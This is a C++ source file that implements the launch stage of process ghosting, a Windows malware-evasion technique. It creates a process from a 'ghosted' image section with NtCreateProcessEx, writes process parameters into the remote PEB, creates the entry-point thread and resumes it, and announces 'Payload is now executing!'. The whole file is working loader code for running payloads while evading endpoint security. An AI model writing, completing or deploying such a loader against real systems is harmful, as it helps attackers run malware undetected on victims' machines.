#include "ProcessExecutor.hpp"
#include "SectionManager.hpp"
#include <iostream>

/**
 * Creates a process object using the image section.
 * Note: NtCreateProcessEx is a native API and is used here to create a
 * process "skeleton" without actually starting it yet.
 */
HANDLE ProcessExecutor::CreateProcessFromSection(HANDLE sectionHandle)
{
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    // NtCreateProcessEx parameters:
    // - ProcessHandle: Output handle to the new process
    // - DesiredAccess: PROCESS_ALL_ACCESS
    // - ObjectAttributes: Unnamed object
    // - ParentProcess: Current process (must be a valid handle, not NULL)
    // - Flags: 0
    // - SectionHandle: The handle to our ghosted image section
    // - DebugPort: NULL
    // - ExceptionPort: NULL
    // - InJob: FALSE
    NTSTATUS status = DynamicNT::Instance().NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &objAttr,
        GetCurrentProcess(),
        0,
        sectionHandle,
        NULL,
        NULL,
        FALSE);

    if (!NT_SUCCESS(status))
    {
        CommonUtils::LogStatus("NtCreateProcessEx", status);
        return NULL;
    }

    std::cout << "[+] Process object created from section." << std::endl;
    return hProcess;
}

/**
 * Creates a thread in the newly created process.
 * The StartRoutine is the absolute address of the entry point.
 * In a ghosted process, the image base is typically mapped at its preferred address.
 */
HANDLE ProcessExecutor::CreateProcessThread(HANDLE processHandle, uint32_t entryPointRVA)
{
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    // Resolve the image base from the new process's PEB, then add the RVA.
    // Passing the raw RVA as a pointer would jump into unmapped memory.
    PROCESS_BASIC_INFORMATION pbi = {};
    NTSTATUS queryStatus = DynamicNT::Instance().NtQueryInformationProcess(
        processHandle,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        NULL);

    if (!NT_SUCCESS(queryStatus))
    {
        CommonUtils::LogStatus("NtQueryInformationProcess", queryStatus);
        return NULL;
    }

    // PEB.ImageBaseAddress sits at offset 0x10 (x64).
    PVOID imageBase = nullptr;
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(
            processHandle,
            reinterpret_cast<LPCVOID>(reinterpret_cast<uintptr_t>(pbi.PebBaseAddress) + 0x10),
            &imageBase,
            sizeof(imageBase),
            &bytesRead) || bytesRead != sizeof(imageBase))
    {
        std::cerr << "[-] Failed to read ImageBaseAddress from PEB. Error: " << GetLastError() << std::endl;
        return NULL;
    }

    PVOID startRoutine = reinterpret_cast<PVOID>(
        reinterpret_cast<uintptr_t>(imageBase) + entryPointRVA);

    NTSTATUS status = DynamicNT::Instance().NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        &objAttr,
        processHandle,
        startRoutine,
        NULL,
        0,
        0,
        0,
        0,
        NULL);

    if (!NT_SUCCESS(status))
    {
        CommonUtils::LogStatus("NtCreateThreadEx", status);
        return NULL;
    }

    std::cout << "[+] Primary thread created at RVA: 0x" << std::hex << entryPointRVA << std::dec << std::endl;
    return hThread;
}

/**
 * Resumes the thread. Until this is called, the thread is created in a
 * suspended state.
 */
bool ProcessExecutor::ExecutePayload(HANDLE threadHandle)
{
    ULONG numSuspend = 0;
    NTSTATUS status = DynamicNT::Instance().NtResumeThread(threadHandle, &numSuspend);

    if (!NT_SUCCESS(status))
    {
        CommonUtils::LogStatus("NtResumeThread", status);
        return false;
    }

    std::cout << "[+] Thread resumed. Payload is now executing!" << std::endl;
    return true;
}

/**
 * Writes RTL_USER_PROCESS_PARAMETERS into the new process's PEB.
 * Without this the loader has no image path, environment, or working directory,
 * and will crash during CRT/loader initialization before reaching the entry point.
 *
 * Strategy: RtlCreateProcessParametersEx produces a normalized (absolute-pointer)
 * params block. We attempt VirtualAllocEx at that exact address in the remote
 * process so the embedded UNICODE_STRING pointers remain valid without fixup.
 * If the address is already taken we fall back to any free region and patch
 * the pointers before copying.
 */
bool ProcessExecutor::SetupProcessParameters(HANDLE processHandle, const std::wstring &imagePath)
{
    UNICODE_STRING uImagePath;
    CommonUtils::ToUnicodeString(imagePath, uImagePath);

    RTL_USER_PROCESS_PARAMETERS *params = nullptr;
    // RTL_USER_PROCESS_PARAMETERS_NORMALIZED (0x01): strings use absolute pointers
    NTSTATUS status = DynamicNT::Instance().RtlCreateProcessParametersEx(
        &params,
        &uImagePath,
        NULL,
        NULL,
        &uImagePath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        0x01);

    if (!NT_SUCCESS(status))
    {
        CommonUtils::LogStatus("RtlCreateProcessParametersEx", status);
        return false;
    }

    // Try to reserve the same VA in the remote process so absolute pointers stay valid.
    PVOID remoteParams = VirtualAllocEx(
        processHandle,
        params,
        params->MaximumLength,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!remoteParams)
    {
        // Address taken — allocate anywhere and fix up each embedded pointer.
        remoteParams = VirtualAllocEx(
            processHandle,
            NULL,
            params->MaximumLength,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (!remoteParams)
        {
            std::cerr << "[-] VirtualAllocEx for process parameters failed. Error: "
                      << GetLastError() << std::endl;
            DynamicNT::Instance().RtlDestroyProcessParameters(params);
            return false;
        }

        // Rebase: delta between local and remote base, applied to every non-NULL string buffer.
        intptr_t delta = reinterpret_cast<intptr_t>(remoteParams) -
                         reinterpret_cast<intptr_t>(params);

        auto rebase = [&](UNICODE_STRING &us) {
            if (us.Buffer)
                us.Buffer = reinterpret_cast<PWCH>(reinterpret_cast<intptr_t>(us.Buffer) + delta);
        };

        rebase(params->CurrentDirectory.DosPath);
        rebase(params->DllPath);
        rebase(params->ImagePathName);
        rebase(params->CommandLine);
        rebase(params->WindowTitle);
        rebase(params->DesktopInfo);
        rebase(params->ShellInfo);
        rebase(params->RuntimeData);
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(processHandle, remoteParams, params, params->MaximumLength, &bytesWritten))
    {
        std::cerr << "[-] WriteProcessMemory for process parameters failed. Error: "
                  << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteParams, 0, MEM_RELEASE);
        DynamicNT::Instance().RtlDestroyProcessParameters(params);
        return false;
    }

    // Write remoteParams pointer into PEB.ProcessParameters (offset 0x20 on x64).
    PROCESS_BASIC_INFORMATION pbi = {};
    DynamicNT::Instance().NtQueryInformationProcess(
        processHandle, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    PVOID pebParamsField = reinterpret_cast<PVOID>(
        reinterpret_cast<uintptr_t>(pbi.PebBaseAddress) + 0x20);

    if (!WriteProcessMemory(processHandle, pebParamsField, &remoteParams, sizeof(remoteParams), &bytesWritten))
    {
        std::cerr << "[-] WriteProcessMemory for PEB.ProcessParameters failed. Error: "
                  << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteParams, 0, MEM_RELEASE);
        DynamicNT::Instance().RtlDestroyProcessParameters(params);
        return false;
    }

    DynamicNT::Instance().RtlDestroyProcessParameters(params);
    std::cout << "[+] Process parameters written to target process." << std::endl;
    return true;
}

/**
 * Orchestrates the process and thread creation sequence.
 */
bool ProcessExecutor::Run(HANDLE sectionHandle, uint32_t entryPointRVA, const std::wstring &imagePath)
{
    HANDLE hProcess = CreateProcessFromSection(sectionHandle);
    if (!hProcess)
        return false;

    if (!SetupProcessParameters(hProcess, imagePath))
    {
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateProcessThread(hProcess, entryPointRVA);
    if (!hThread)
    {
        CloseHandle(hProcess);
        return false;
    }

    bool success = ExecutePayload(hThread);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return success;
}
